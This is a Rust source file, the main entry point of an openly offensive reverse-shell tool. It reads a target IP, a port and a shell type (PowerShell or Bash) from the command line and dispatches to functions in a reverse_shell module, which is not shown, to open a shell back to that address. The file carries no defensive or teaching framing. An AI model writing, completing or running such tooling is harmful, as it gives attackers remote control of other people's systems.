mod reverse_shell;

use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 4 {
        eprintln!("Usage: {} <ip> <port> <type>", args[0]);
        eprintln!("Type: powershell | bash");
        return;
    }

    let ip = &args[1];
    let port = &args[2];
    let reverse_type = &args[3];

    match reverse_type.as_str() {
        "powershell" => reverse_shell::run_powershell_shell(ip, port),
        "bash" => reverse_shell::run_bash_shell(ip, port),
        _ => eprintln!("Invalid type. Use 'powershell', or 'bash'."),
    }
}
